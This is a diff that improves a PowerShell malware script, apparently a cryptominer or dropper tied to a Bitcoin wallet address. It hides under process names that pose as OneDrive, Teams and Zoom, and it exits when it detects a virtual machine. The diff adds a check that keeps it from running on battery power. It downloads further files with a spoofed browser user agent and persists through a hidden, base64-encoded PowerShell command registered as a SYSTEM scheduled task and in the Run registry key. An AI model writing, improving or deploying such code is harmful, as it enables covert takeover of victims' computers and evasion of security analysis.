@@ -8,12 +8,17 @@ $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
 $ProcessNames = @("OneDriveStandalone", "TeamsDesktop", "ZoomManager", "DiscordUpdate", "EdgeBroker", "SpotifyHelper")
 $Name1 = ($ProcessNames | Get-Random) + ".exe"
 $Name2 = ($ProcessNames | Where-Object { $_ -ne $Name1 } | Get-Random) + ".exe"
-$StealthDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"
+$StealthDir = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Microsoft", "Windows", "UpdateCoord")
 
-# ANTI-SANDBOX GUARD
-$Check = @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " "
+# ANTI-ANALYSIS & POWER GUARD
+$Check = try { @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " " } catch { "" }
 if ($Check -match "VirtualBox" -or $Check -match "VMware" -or $Check -match "VIRTUAL") { exit }
 if (Test-Path "C:\windows\System32\Drivers\VBoxMouse.sys") { exit }
+
+try {
+    $Power = Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue
+    if ($Power -and $Power.BatteryStatus -eq 1) { exit } # Don't run on battery
+} catch { }
 
 function Get-StealthFile($Url, $Path) {
     $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
@@ -94,11 +99,15 @@ if (Get-StealthFile $DllUrl $DllPath) {
         $Encoded = [Convert]::ToBase64String($Bytes)
         $TPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $Encoded"
         
-        if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-            schtasks.exe /create /tn "Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "$TPath" /sc onlogon /rl highest /f /ru "System"
+        # SELF-HEALING PERSISTENCE
+        $TaskPath = "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan"
+        $Admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        
+        if ($Admin) {
+            schtasks.exe /create /tn "$TaskPath" /tr "$TPath" /sc onlogon /rl highest /f /ru "System" /ErrorAction SilentlyContinue
         } else {
-            schtasks.exe /create /tn "WindowsUpdateScan" /tr "$TPath" /sc onlogon /f
+            schtasks.exe /create /tn "WindowsUpdateScan" /tr "$TPath" /sc onlogon /f /ErrorAction SilentlyContinue
         }
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value $TPath
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$TPath" -ErrorAction SilentlyContinue
     } catch { }
 }
